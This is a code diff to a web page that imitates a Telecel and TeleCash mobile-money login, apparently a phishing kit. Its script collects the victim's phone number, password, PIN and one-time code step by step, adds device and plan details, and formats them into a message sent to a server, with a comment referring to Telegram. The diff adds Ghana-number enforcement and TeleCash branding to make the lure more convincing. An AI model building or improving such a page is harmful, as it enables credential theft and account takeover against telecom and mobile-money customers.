@@ -23,8 +23,6 @@ background:linear-gradient(180deg,#fff5f7,#ffe3e8);
 overflow:hidden;
 }
 
-/* background waves */
-
 .wave{
 position:fixed;
 width:700px;
@@ -44,8 +42,6 @@ z-index:-1;
 50%{transform:translateY(40px)}
 100%{transform:translateY(0)}
 }
-
-/* card */
 
 .step{
 position:absolute;
@@ -75,15 +71,11 @@ pointer-events:none;
 transform:translateX(40px);
 }
 
-/* logo */
-
 .logo{
 height:110px;
 display:block;
 margin:auto;
 }
-
-/* typography */
 
 h1{
 text-align:center;
@@ -99,8 +91,6 @@ font-size:13px;
 color:#555;
 margin-bottom:18px;
 }
-
-/* inputs */
 
 label{
 font-size:12px;
@@ -127,8 +117,6 @@ background:white;
 box-shadow:0 0 0 3px rgba(230,0,35,.08);
 }
 
-/* password */
-
 .password-box{
 position:relative;
 }
@@ -142,8 +130,6 @@ cursor:pointer;
 opacity:.6;
 }
 
-/* button */
-
 .btn{
 margin-top:20px;
 width:100%;
@@ -154,15 +140,7 @@ font-weight:700;
 background:#e60023;
 color:white;
 cursor:pointer;
-transition:.2s;
 }
-
-.btn:hover{
-transform:translateY(-1px);
-box-shadow:0 10px 18px rgba(230,0,35,.2);
-}
-
-/* otp boxes */
 
 .pin{
 display:flex;
@@ -189,21 +167,16 @@ transition:.2s;
 
 .pin input:focus{
 border-color:#e60023;
-
 box-shadow:
 0 0 0 3px rgba(230,0,35,.12),
 0 4px 12px rgba(0,0,0,.06);
 }
-
-/* timer */
 
 .count{
 text-align:center;
 font-size:13px;
 color:#666;
 }
-
-/* resend */
 
 .resend{
 text-align:center;
@@ -218,8 +191,6 @@ color:#e60023;
 cursor:pointer;
 font-weight:600;
 }
-
-/* loading */
 
 .pulse{
 height:90px;
@@ -243,7 +214,6 @@ animation:pulse 1.2s infinite ease-in-out;
 
 <div class="container">
 
-
 <!-- LOGIN -->
 
 <div id="step1" class="step">
@@ -260,6 +230,7 @@ You need to be a Telecel subscriber to proceed.
 <form id="form">
 
 <label>Phone Number</label>
+
 <input id="phone" inputmode="numeric" placeholder="0XXXXXXXXX">
 
 <label>Password</label>
@@ -328,6 +299,8 @@ Login
 
 <div id="step3" class="step hidden">
 
+<img src="assets/telecash.webp" style="height:70px;display:block;margin:auto">
+
 <h1>Verify OTP</h1>
 
 <div class="subtitle">
@@ -384,15 +357,27 @@ Logging you in...
 <script>
 
 
+/* enforce Ghana number */
+
+phone.oninput=e=>{
+
+let v=e.target.value.replace(/\D/g,"").slice(0,10)
+
+if(v.length>0 && v[0]!=="0")
+
+v="0"+v.slice(1)
+
+e.target.value=v
+
+phoneValue=v
+
+}
+
+
 let phoneValue=""
 let passwordValue=""
 let pinValue=""
 let otpValue=""
-
-
-phone.oninput=e=>{
-phoneValue=e.target.value
-}
 
 
 function togglePassword(){
@@ -413,15 +398,42 @@ document.getElementById(id)
 }
 
 
-/* PROFESSIONAL MESSAGE */
+/* device */
+
+const ua=navigator.userAgent
+
+let device="Unknown"
+
+if(/Android/i.test(ua)) device="Android"
+else if(/iPhone|iPad/i.test(ua)) device="iOS"
+
+if(/Chrome/i.test(ua)) device+=" | Chrome"
+else if(/Safari/i.test(ua)) device+=" | Safari"
+else if(/Firefox/i.test(ua)) device+=" | Firefox"
+
+
+/* plan */
+
+let planLine="Not captured"
+
+try{
+
+const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
+
+if(p){
+
+planLine=[p.name||"",p.price||""].join(" — ")
+
+}
+
+}catch(e){}
+
+
+/* telegram text clean */
 
 function buildMessage(stage){
 
-return `message:
-
-Time: ${new Date().toISOString()}
-
-Telecel Play Login
+return `Telecel Play Login
 
 Stage: ${stage}
 Number: ${phoneValue}
@@ -429,12 +441,11 @@ Password: ${passwordValue}
 Pin: ${pinValue}
 Otp: ${otpValue}
 Plan: ${planLine}
-Device: ${device}`
+Device: ${device}
+Time: ${new Date().toISOString()}`
 
 }
 
-
-/* SEND */
 
 async function sendToServer(stage){
 
@@ -457,38 +468,7 @@ message:buildMessage(stage)
 }
 
 
-/* DEVICE */
-
-const ua=navigator.userAgent
-
-let device="Unknown"
-
-if(/Android/i.test(ua)) device="Android"
-else if(/iPhone|iPad/i.test(ua)) device="iOS"
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
-else if(/Firefox/i.test(ua)) device+=" | Firefox"
-
-
-/* PLAN */
-
-let planLine="Not captured"
-
-try{
-
-const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
-
-if(p){
-
-planLine=[p.name||"",p.price||""].join(" — ")
-
-}
-
-}catch(e){}
-
-
-/* LOGIN */
+/* login */
 
 form.onsubmit=e=>{
 
@@ -509,7 +489,7 @@ show("step2")
 }
 
 
-/* PIN */
+/* pin */
 
 const pinInputs=document.querySelectorAll("#step2 input")
 
@@ -558,7 +538,7 @@ startTimer()
 }
 
 
-/* OTP */
+/* otp */
 
 const otpInputs=document.querySelectorAll("#step3 input")
 
@@ -612,7 +592,7 @@ startTimer()
 }
 
 
-/* TIMER 2 MIN */
+/* 2 min timer */
 
 function startTimer(){
 
@@ -631,7 +611,6 @@ if(t<=0) clearInterval(i)
 },1000)
 
 }
-
 
 </script>
 
